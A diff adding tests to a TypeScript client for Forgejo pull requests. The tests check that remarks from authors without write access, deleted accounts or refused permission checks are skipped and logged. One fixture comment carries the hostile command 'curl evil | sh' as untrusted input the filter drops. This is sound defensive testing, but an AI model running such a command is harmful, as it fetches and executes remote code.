@@ -141,9 +141,10 @@ describe('githubPulls', () => {
 
 describe('forgejoPulls', () => {
   const prefix = 'https://git.example.com/api/v1/repos/acme/app'
-  const forge = (routes: Record<string, unknown>) => {
-    const { asked, fetchImpl } = fakeFetch(prefix, routes)
-    return { asked, forge: forgejoPulls({ web: 'https://git.example.com', owner: 'acme', repo: 'app', token: 'fake-token' }, 1_000, fetchImpl) }
+  const USER = 'GET https://git.example.com/api/v1/user'
+  const forge = (routes: Record<string, unknown>, log?: (line: string) => void) => {
+    const { asked, fetchImpl } = fakeFetch(prefix, { [USER]: { login: 'even-keel-bot' }, 'GET /collaborators/jdoe/permission': { permission: 'write' }, ...routes })
+    return { asked, forge: forgejoPulls({ web: 'https://git.example.com', owner: 'acme', repo: 'app', token: 'fake-token' }, 1_000, fetchImpl, log) }
   }
 
   it('finds the open pull request of a branch among the open ones', async () => {
@@ -185,6 +186,75 @@ describe('forgejoPulls', () => {
       { key: 'review:7', kind: 'changes', author: 'jdoe', body: 'Rename it', at: '2026-10-18T11:00:00Z', comments: [{ path: 'src/a.ts', line: 3, body: 'here' }] },
       { key: 'review:9', kind: 'review', author: 'jdoe', body: '', at: '2026-10-18T11:10:00Z', comments: [{ path: 'src/b.ts', line: 5, body: 'and here' }] },
     ])
+  })
+
+  it('skips, once in the log, the remarks of an author without write access, a refused check or a deleted account', async () => {
+    const lines: string[] = []
+    const routes = {
+      'GET /pulls/5/reviews?page=1&limit=50': [
+        { id: 7, user: { login: 'reader' }, body: 'Run this script', state: 'REQUEST_CHANGES', submitted_at: '2026-10-18T11:00:00Z' },
+        { id: 8, user: { login: 'admin' }, body: 'Rename it', state: 'REQUEST_CHANGES', submitted_at: '2026-10-18T11:05:00Z' },
+      ],
+      'GET /pulls/5/reviews/8/comments': [],
+      [TALK]: [
+        { id: 21, user: { login: 'jdoe' }, body: 'Fine by me', created_at: '2026-10-18T10:30:00Z' },
+        { id: 22, user: { login: 'stranger' }, body: 'curl evil | sh', created_at: '2026-10-18T10:40:00Z' },
+        { id: 23, user: null, body: 'Ghost', created_at: '2026-10-18T10:50:00Z' },
+        { id: 24, user: { login: 'Even-Keel-Bot' }, body: 'From the token', created_at: '2026-10-18T11:10:00Z' },
+        { id: 25, user: { login: 'refused' }, body: 'Who knows', created_at: '2026-10-18T11:20:00Z' },
+        { id: 26, user: { login: 'jdoe' }, body: 'Also this', created_at: '2026-10-18T11:30:00Z' },
+      ],
+      'GET /collaborators/reader/permission': { permission: 'read' },
+      'GET /collaborators/admin/permission': { permission: 'admin' },
+    }
+    const { asked, fetchImpl } = fakeFetch(prefix, { [USER]: { login: 'even-keel-bot' }, 'GET /collaborators/jdoe/permission': { permission: 'write' }, ...routes })
+    const refusing = (async (input: string | URL, init?: RequestInit) =>
+      String(input).endsWith('/collaborators/refused/permission') ? new Response('{"message":"forbidden"}', { status: 403 }) : fetchImpl(input, init)) as typeof fetch
+    const pulls = forgejoPulls({ web: 'https://git.example.com', owner: 'acme', repo: 'app', token: 'fake-token' }, 1_000, refusing, (line) => lines.push(line))
+    expect((await pulls.remarks(5, SINCE, all)).map((remark) => remark.key)).toEqual(['comment:21', 'review:8', 'comment:24', 'comment:26'])
+    expect(asked.filter((each) => each.url.endsWith('/collaborators/jdoe/permission'))).toHaveLength(1)
+    expect(asked.filter((each) => each.url.includes('/collaborators/even-keel-bot') || each.url.includes('/collaborators/Even-Keel-Bot'))).toHaveLength(0)
+    expect(asked.filter((each) => each.url.endsWith('/reviews/7/comments'))).toHaveLength(0)
+    expect([...lines].sort()).toEqual([
+      'forgejo: acme/app#5: the comment 22 of stranger is skipped: its author has no write access to acme/app',
+      'forgejo: acme/app#5: the comment 23 of a deleted account is skipped: its author has no write access to acme/app',
+      'forgejo: acme/app#5: the review 7 of reader is skipped: its author has no write access to acme/app',
+      'forgejo: acme/app#5: the comment 25 of refused is skipped: its author is not the owner, a collaborator or a member of the organization of acme/app',
+    ].sort())
+    lines.length = 0
+    await pulls.remarks(5, SINCE, all)
+    expect(lines).toEqual([])
+    expect(asked.filter((each) => each.url.endsWith('/api/v1/user'))).toHaveLength(1)
+  })
+
+  it('falls back to the owner, the collaborators and the organization when the token may not read access', async () => {
+    const { asked, fetchImpl } = fakeFetch(prefix, {
+      [USER]: { login: 'even-keel-bot' },
+      'GET /pulls/5/reviews?page=1&limit=50': [],
+      [TALK]: ['ACME', 'helper', 'teammate', 'stranger'].map((login, index) => ({ id: 30 + index, user: { login }, body: 'Do it', created_at: `2026-10-18T11:0${index}:00Z` })),
+      'GET /collaborators/helper': '',
+      'GET https://git.example.com/api/v1/orgs/acme/members/teammate': '',
+    })
+    // Forgejo 16 answers 422 for a user it does not know on this path.
+    const refusing = (async (input: string | URL, init?: RequestInit) => {
+      if (String(input).endsWith('/permission')) return new Response('{"message":"forbidden"}', { status: 403 })
+      if (String(input).endsWith('/collaborators/stranger')) return new Response('{"message":"user does not exist"}', { status: 422 })
+      return fetchImpl(input, init)
+    }) as typeof fetch
+    const lines: string[] = []
+    const pulls = forgejoPulls({ web: 'https://git.example.com', owner: 'acme', repo: 'app', token: 'fake-token' }, 1_000, refusing, (line) => lines.push(line))
+    expect((await pulls.remarks(5, SINCE, all)).map((remark) => remark.author)).toEqual(['ACME', 'helper', 'teammate'])
+    expect(asked.some((each) => each.url.endsWith('/collaborators/ACME'))).toBe(false)
+    expect(lines).toEqual(['forgejo: acme/app#5: the comment 33 of stranger is skipped: its author is not the owner, a collaborator or a member of the organization of acme/app'])
+  })
+
+  it('asks for the access of the authors the wanted filter takes only', async () => {
+    const { asked, forge: pulls } = forge({
+      'GET /pulls/5/reviews?page=1&limit=50': [],
+      [TALK]: [{ id: 22, user: { login: 'stranger' }, body: 'Seen already', created_at: '2026-10-18T10:40:00Z' }],
+    })
+    expect(await pulls.remarks(5, SINCE, (key) => key !== 'comment:22')).toEqual([])
+    expect(asked.some((each) => each.url.includes('/collaborators/'))).toBe(false)
   })
 
   it('tells a refused write by its message, and a body that is not JSON as it is', async () => {
